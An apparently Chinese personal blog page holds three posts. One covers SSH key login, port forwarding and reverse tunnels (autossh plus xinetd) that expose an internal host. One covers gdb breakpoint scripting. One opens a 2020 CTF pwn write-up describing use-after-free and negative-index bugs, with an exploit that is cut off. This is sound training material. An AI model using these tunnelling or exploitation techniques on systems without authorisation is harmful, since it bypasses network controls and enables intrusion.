<h2 id="2-2-添加公钥"><a href="#2-2-添加公钥" class="headerlink" title="2.2. 添加公钥"></a>2.2. 添加公钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h2 id="2-3-禁用密码登录-amp-amp-启用密钥登录"><a href="#2-3-禁用密码登录-amp-amp-启用密钥登录" class="headerlink" title="2.3. 禁用密码登录&amp;&amp;启用密钥登录"></a>2.3. 禁用密码登录&amp;&amp;启用密钥登录</h2><p>参考[2]</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑 sshd_config 文件 </span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用密码验证 </span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"><span class="comment"># 启用密钥验证 </span></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment"># 指定公钥数据库文件 </span></span><br><span class="line">AuthorsizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h2 id="2-4-使用跳板机登录目标服务器"><a href="#2-4-使用跳板机登录目标服务器" class="headerlink" title="2.4. 使用跳板机登录目标服务器"></a>2.4. 使用跳板机登录目标服务器</h2><p>一种方法是使用<code>ProxyCommand</code>参考[3]. 不过实际使用的话并不推荐, 比较麻烦.</p>
<p>可以结合 <code>ssh -L</code> 端口转发功能. 比如有三台主机: <code>A</code>, <code>B</code>, <code>C</code>. 其对应ip为 <code>ip_A</code>, <code>ip_B</code>, <code>ip_C</code>. <code>A</code>可以访问<code>B</code>, <code>B</code>可以访问<code>C</code>, 但是<code>A</code>不能直接访问<code>C</code>.</p>
<p>我们想要在<code>A</code>上用<code>ssh</code>登录<code>C</code>. 那么可以进行如下操作:</p>
<p>在<code>A</code>上执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 2333:ip_C:22 root@ip_B</span><br><span class="line"><span class="comment"># 需要配置密钥登录`B`或输入主机``上`root`用户的密码</span></span><br></pre></td></tr></table></figure>

<p>此时在<code>A</code>上访问 <code>127.0.0.1:2333</code>就等价于访问<code>ip_C:22</code>.</p>
<p>所以在<code>A</code>上执行如下命令即可登录<code>C</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1 -p 2333</span><br><span class="line"><span class="comment"># 需要配置密钥登录`C`或输入主机`C`上`root`用户的密码</span></span><br></pre></td></tr></table></figure>


<h2 id="2-5-ssh-config"><a href="#2-5-ssh-config" class="headerlink" title="2.5. ssh_config"></a>2.5. ssh_config</h2><p>官方文档参考[4]</p>
<p>说来惭愧, 用了<code>ssh</code>这么久一直不知道有<code>ssh_config</code>这个东西. 还是前不久查<code>vscode</code>的<code>remote-ssh</code>插件的文档时才无意间知道有这么个东西.</p>
<p>通过配置<code>ssh_config</code>可以免去每次使用<code>ssh</code>/<code>sftp</code>时输入用户名, ip, 端口等操作.</p>
<p>配置文件通常位于 <code>~/.ssh/ssh_config</code>, 配置文件具体怎么写我们就用上一节的<a href="#24-%E4%BD%BF%E7%94%A8%E8%B7%B3%E6%9D%BF%E6%9C%BA%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8">2.4. 使用跳板机登录目标服务器</a>举个例子.</p>
<p>在配置好代理之后我们连接主机<code>C</code>需要通过如下命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1 -p 2333</span><br></pre></td></tr></table></figure>

<p>我们可以在 <code>~/.ssh/ssh_config</code> 添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host host_C</span><br><span class="line">    HostName 127.0.0.1</span><br><span class="line">    User root</span><br><span class="line">    Port 2333</span><br></pre></td></tr></table></figure>

<p>之后再想要连接主机<code>C</code>只需要执行如下命令即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh host_C</span><br></pre></td></tr></table></figure>

<p>想要用<code>sftp</code>传文件的话也可以用类似的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sftp host_C</span><br></pre></td></tr></table></figure>

<p><code>ssh_config</code>支持配置多个主机.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Host host_C</span><br><span class="line">    HostName 127.0.0.1</span><br><span class="line">    User root</span><br><span class="line">    Port 2333</span><br><span class="line">Host host_B</span><br><span class="line">    HostName ip_B</span><br><span class="line">    User root</span><br><span class="line">    Port 22</span><br></pre></td></tr></table></figure>

<p><code>ssh_config</code>甚至还支持域名通配符等操作, 这儿就不再细说, 可以参考官方文档[4].</p>
<h2 id="2-6-端口转发功能"><a href="#2-6-端口转发功能" class="headerlink" title="2.6. 端口转发功能"></a>2.6. 端口转发功能</h2><h3 id="2-6-1-ssh-L"><a href="#2-6-1-ssh-L" class="headerlink" title="2.6.1. ssh -L"></a>2.6.1. ssh -L</h3><p>设有三台主机: <code>A</code>, <code>B</code>, <code>C</code>. 其对应ip为 <code>ip_A</code>, <code>ip_B</code>, <code>ip_C</code>.</p>
<p>如果在主机<code>A</code>上执行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1234:ip_C:5678 root@ip_B</span><br></pre></td></tr></table></figure>

<p>那么访问主机<code>A</code>的<code>1234</code>端口就等价于访问主机 <code>C</code> 的 <code>5678</code> 端口(两者直接会通过主机<code>B</code>作为中介建立一个隧道)</p>
<p>这种转发方式的应用场景为: <code>A</code>可以访问<code>B</code>, <code>B</code>可以访问<code>C</code>, 但是<code>A</code>不能直接访问<code>C</code>.</p>
<h3 id="2-6-2-ssh-R"><a href="#2-6-2-ssh-R" class="headerlink" title="2.6.2. ssh -R"></a>2.6.2. ssh -R</h3><p>设有两台主机: <code>A</code>, <code>B</code>. 其对应ip为 <code>ip_A</code>, <code>ip_B</code>.</p>
<p>如果在主机<code>A</code>上执行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1234:127.0.0.1:5678 root@ip_B</span><br></pre></td></tr></table></figure>

<p><strong><em>注意: 这儿一定要是root用户</em></strong></p>
<p>那么此时在<code>B</code>上访问 <code>localhost:1234</code> 就等价于访问 <code>A</code> 的 <code>5678</code> 端口.</p>
<p><strong><em>若想实现可以通过<code>ip_B:1234</code>访问主机<code>A</code>的<code>127.0.0.1:5678</code>还需要配置一层代理, 具体方式后面关于内网穿透的章节会说</em></strong></p>
<p>这种转发方式的应用场景为: <code>A</code>是一个内网主机, <code>B</code> 是一个公网主机. 用户想随时随地可以访问<code>A</code>, 就需要做一个反向代理实现内网穿透, 使得用户可以通过 <code>B</code> 作为中介访问 <code>A</code>.</p>
<h3 id="2-6-3-ssh-D"><a href="#2-6-3-ssh-D" class="headerlink" title="2.6.3. ssh -D"></a>2.6.3. ssh -D</h3><p>设有两台主机: <code>A</code>, <code>B</code>. 其对应ip为 <code>ip_A</code>, <code>ip_B</code>.</p>
<p>如果在主机<code>A</code>上执行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1234 root@ip_B</span><br></pre></td></tr></table></figure>

<p>那么主机<code>A</code>的 <code>localhost:1234</code> 就会有一个<code>socks</code>代理, 所有走这个代理的流量都会通过主机<code>B</code>转发出去.</p>
<p>这种转发方式的应用场景为: 懒得安装/启动socks代理软件客户端.</p>
<h2 id="2-7-autossh-xinetd-实现内网穿透"><a href="#2-7-autossh-xinetd-实现内网穿透" class="headerlink" title="2.7. autossh + xinetd 实现内网穿透"></a>2.7. autossh + xinetd 实现内网穿透</h2><p>设有两台主机: <code>A</code>, <code>B</code>. 其对应ip为 <code>ip_A</code>, <code>ip_B</code>, <code>A</code>是一个内网主机, <code>B</code> 是一个公网主机. 我们的需求是随时随地可以访问<code>A</code>上的资源.</p>
<p>我们可以使用前面提到的 <code>ssh -R</code> 转发方式, 在<code>A</code>上执行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1234:127.0.0.1:22 root@ip_B</span><br></pre></td></tr></table></figure>

<p><strong><em>注意: 22是ssh server的端口</em></strong></p>
<p>此时我们若在<code>B</code>上执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1 -p 1234</span><br></pre></td></tr></table></figure>

<p>并输入<code>A</code>上<code>root</code>用户的密码, 我们就可以成功登录主机<code>A</code>.</p>
<p>但是<code>B</code>的<code>127.0.0.1</code>只有自己能访问, 别的主机想访问<code>B</code>上的<code>1234</code>端口只能通过<code>ip_B</code>进行访问, 所以我们这儿可以在<code>B</code>上启动一个转发服务: 将<code>ip_B:5678</code>来的流量转发至<code>127.0.0.1:1234</code>(<strong><em>两个端口建议不相同, 避免可能的冲突</em></strong>). 我这儿用的是 <code>xinetd</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install xinetd</span><br><span class="line">$ cat ./proxy</span><br><span class="line">service http-switch</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">disable</span> = no</span><br><span class="line"> <span class="built_in">type</span> = UNLISTED</span><br><span class="line"> socket_type = stream</span><br><span class="line"> protocol = tcp</span><br><span class="line"> <span class="built_in">wait</span> = no</span><br><span class="line"> redirect = 127.0.0.1 1234</span><br><span class="line"> <span class="built_in">bind</span> = 0.0.0.0</span><br><span class="line"> port = 5678</span><br><span class="line"> user = nobody</span><br><span class="line">&#125;</span><br><span class="line">$ cp ./proxy /etc/xinetd.d/</span><br><span class="line">$ sudo /etc/init.d/xinetd restart</span><br><span class="line">[ ok ] Restarting xinetd (via systemctl): xinetd.service.</span><br></pre></td></tr></table></figure>

<p>此时我们在任何一台可以访问外网的主机上执行如下命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@ip_B -p 5678</span><br></pre></td></tr></table></figure>

<p>并输入<code>A</code>上<code>root</code>用户的密码, 就可以登录上<code>A</code>了.</p>
<p><code>autossh</code>和<code>ssh</code>功能差不多, 但是多一个自动断线重连功能, 因此搭建内网穿透服务的时候稳定性更好.</p>
<p>使用命令和<code>ssh</code>类似:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install autossh</span><br><span class="line">$ autossh -M 7788 -NfR 1234:127.0.0.1:22 root@ip_B</span><br></pre></td></tr></table></figure>

<p><code>-M</code> 参数声明一个没有被占用的端口, <code>autossh</code> 会使用这个端口检测连接是否存在, 如果断掉的话就需要进行重连操作. </p>
<p><code>-N</code> 和 <code>-f</code> 参数是让 <code>autossh</code> 不打印信息, 在后台运行. (<code>ssh</code>同样可以加上这两个参数.)</p>
<h1 id="3-结语"><a href="#3-结语" class="headerlink" title="3. 结语"></a>3. 结语</h1><blockquote>
<p>不会用ssh的网管不是好程序员</p>
</blockquote>
<h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/upshi/article/details/78630285">SSH 反向隧道 内网穿透，AutoSSH自动重连</a></li>
<li><a target="_blank" rel="noopener" href="https://wsgzao.github.io/post/ssh/">SSH 使用密钥登录并禁止口令登录实践</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/">SSH ProxyCommand example: Going through one host to reach another server</a></li>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/ssh_config.5.html">ssh_config(5) Linux manual page</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/05/2020-09-05-7-gdb-commands/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/05/2020-09-05-7-gdb-commands/" class="post-title-link" itemprop="url">gdb 自动化操作</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-09-05 00:00:00 / 修改时间：22:31:13" itemprop="dateCreated datePublished" datetime="2020-09-05T00:00:00+08:00">2020-09-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在做强网杯的一道vmpwn的时候, 有了这样一种需求.</p>
<blockquote>
<p>gdb可不可以实现这样一种功能: 在某处下个断点,  然后让程序运行到这个地方自动将当前的寄存器值保存到某个文件中然后继续执行. 最后得到一个包含执行过程中每次到达这个位置的时候的寄存器的值的文件</p>
</blockquote>
<p>据我所知ollydbg是有这种功能的. 可以在每次断点处执行一个脚本. 在脚本中可以通过一些指令将寄存器中的内容保存到文件中并继续执行, 直到下次遇到这个断点或者程序退出.</p>
<p>经过搜索, 发现gdb提供了一个commands命令[2], 可以实现类似的功能. 在此记录一下.</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我们以这份代码为例, 我们希望得到每次循环中val的值.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        val = (<span class="number">7</span> * (val + <span class="number">1</span>) / <span class="number">3</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码编译得到二进制文件中main函数反汇编结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00000000004004d6 &lt;main&gt;:</span><br><span class="line">  4004d6: push   rbp</span><br><span class="line">  4004d7: mov    rbp,rsp</span><br><span class="line">  4004da: mov    DWORD PTR [rbp-0x8],0x1</span><br><span class="line">  4004e1: mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">  4004e8: jmp    400517 &lt;main+0x41&gt;</span><br><span class="line">  4004ea: mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">  4004ed: lea    edx,[rax+0x1]</span><br><span class="line">  4004f0: mov    eax,edx</span><br><span class="line">  4004f2: shl    eax,0x3</span><br><span class="line">  4004f5: sub    eax,edx</span><br><span class="line">  4004f7: mov    ecx,eax</span><br><span class="line">  4004f9: mov    edx,0x55555556</span><br><span class="line">  4004fe: mov    eax,ecx</span><br><span class="line">  400500: imul   edx</span><br><span class="line">  400502: mov    eax,ecx</span><br><span class="line">  400504: sar    eax,0x1f</span><br><span class="line">  400507: sub    edx,eax</span><br><span class="line">  400509: mov    eax,edx</span><br><span class="line">  40050b: and    eax,0xffff</span><br><span class="line">  400510: mov    DWORD PTR [rbp-0x8],eax</span><br><span class="line">  400513: add    DWORD PTR [rbp-0x4],0x1</span><br><span class="line">  400517: cmp    DWORD PTR [rbp-0x4],0x63</span><br><span class="line">  40051b: jle    4004ea &lt;main+0x14&gt;</span><br><span class="line">  40051d: mov    eax,0x0</span><br><span class="line">  400522: pop    rbp</span><br><span class="line">  400523: ret</span><br></pre></td></tr></table></figure>

<p>可以看到在 <code>0x400510</code> 处将计算得到的 <code>val</code> 从 <code>rax</code> 寄存器中存储到了栈上 <code>rbp-0x08</code>地址处.</p>
<p>那么我们就可以写以下gdb脚本 <code>dump.gs</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b *0x400510</span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">printf &quot;val is %#x\n&quot;, $rax</span><br><span class="line">c</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>然后在调试的时候加载这个脚本并直接<code>run</code>即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@vm$ gdb ./<span class="built_in">test</span></span><br><span class="line">(gdb) <span class="built_in">source</span> ./dump.gs</span><br><span class="line">Breakpoint 1 at 0x400510: file test.c, line 9.</span><br><span class="line">(gdb) run</span><br></pre></td></tr></table></figure>

<p>就可以打印出每次循环时val的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run</span><br><span class="line">val is 0x4</span><br><span class="line">val is 0xb</span><br><span class="line">val is 0x1c</span><br><span class="line">val is 0x43</span><br><span class="line">val is 0x9e</span><br><span class="line">val is 0x173</span><br><span class="line">val is 0x364</span><br><span class="line">val is 0x7eb</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>现在可以将val的值打印到终端了. 那么如何将这些信息保存到文件中呢? 在 <code>run</code> 之前执行如下命令即可[3]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set logging on</span><br></pre></td></tr></table></figure>

<p>再次run之后就可以看到当前目录下多了一个 <code>gdb.txt</code>. 里面就是打印的内容.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">local</span> git:(master) ✗ cat ./gdb.txt</span><br><span class="line">Starting program: ...</span><br><span class="line">warning:...</span><br><span class="line">warning: ...</span><br><span class="line"></span><br><span class="line">val is 0x4</span><br><span class="line">val is 0xb</span><br><span class="line">val is 0x1c</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>目前位置虽然可以满足一开始的需求了, 但是每次操作的时候还是感觉很麻烦, 不过做题的时候时间原因到这儿就没有继续深究了. 现在有空了再看看有没有什么更加高效优雅的解决方案.</p>
<p>这个时候自然就想到万能的<code>python</code>了. 通过对官方文档[4]的简单阅读, 最终得到如下脚本. 可以将每次循环的值写入文件.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump.py</span></span><br><span class="line">gdb.execute(<span class="string">&quot;b *0x400510&quot;</span>)</span><br><span class="line">gdb.execute(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">vals = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    gdb.execute(<span class="string">&quot;continue&quot;</span>)</span><br><span class="line">    vals.append(<span class="built_in">str</span>(<span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$rax&quot;</span>))))</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;./vals&quot;</span>, <span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;\n&quot;</span>.join(vals))</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">直接执行如下命令</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">gdb ./test -x ./dump.py</span><br></pre></td></tr></table></figure>

<p>就可以得到一个包含了100次循环中<code>val</code>值的文件<code>./vals</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">local</span> git:(master) ✗ cat ./vals</span><br><span class="line">4</span><br><span class="line">11</span><br><span class="line">28</span><br><span class="line">67</span><br><span class="line">158</span><br><span class="line">371</span><br><span class="line">868</span><br><span class="line">...</span><br></pre></td></tr></table></figure>


<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>常言道 <code>人生苦短, 我用python</code>, 诚不我欺. python灵活的语法以及强大的兼容性使得python在这类写脚本的场景中十分好用. 大多数时候都可以替代<code>shell脚本</code>了. 有时我甚至会想将来会不会又某个shell内置python的那一天. 自此 <code>shell 脚本</code>是路人.</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/13935443/gdb-scripting-execute-commands-at-selected-breakpoint">so上有人提了和我类似的需求</a></li>
<li><a target="_blank" rel="noopener" href="https://sourceware.org/gdb/onlinedocs/gdb/Break-Commands.html">commands 官方文档</a></li>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5941158/gdb-print-to-file-instead-of-stdout">如何将gdb的输出保存到文件</a></li>
<li><a target="_blank" rel="noopener" href="https://sourceware.org/gdb/current/onlinedocs/gdb/Python.html#Python">Extending GDB using Python</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/08/19/2020-08-19-6-ssctf-pwn-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/19/2020-08-19-6-ssctf-pwn-wp/" class="post-title-link" itemprop="url">2020 ssctf(Hacker's Playground) wp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-08-19 00:00:00 / 修改时间：01:12:38" itemprop="dateCreated datePublished" datetime="2020-08-19T00:00:00+08:00">2020-08-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>深刻地感受到自己变菜了. 两道非常简单的题目都没做出来. 一题是堆的uaf. 有个非常明显的整形溢出没有看到, 导致一直无法leak地址. 还有一题也是整形溢出可以, 需要在栈上构造rop链执行system(“sh”), 也是卡住了. 太菜了 :(</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="T-express"><a href="#T-express" class="headerlink" title="T express"></a>T express</h2><p>glibc 2.31. 保护全开. 有个 uaf 漏洞. 但是限制了只能malloc 7次. 通过另一个 off-by-one 漏洞可以实现 double free. 但是因为次数限制所以无法leak 地址. 卡了一会儿就去看别的题目了. 赛后学弟才在 show 功能中没有校验输入的索引是否为负数. 所以可以通过负的索引通过 stdout leak  lbic地址. </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index of ticket: &quot;</span>);</span><br><span class="line">index = read_l();</span><br><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">6</span> &amp;&amp; passes[index] ) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没啥好说的, 就是菜. 不找借口. </p>
<p>exp 如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./t_express&quot;</span></span><br><span class="line">ip = <span class="string">&quot;t-express.sstf.site&quot;</span></span><br><span class="line">port = <span 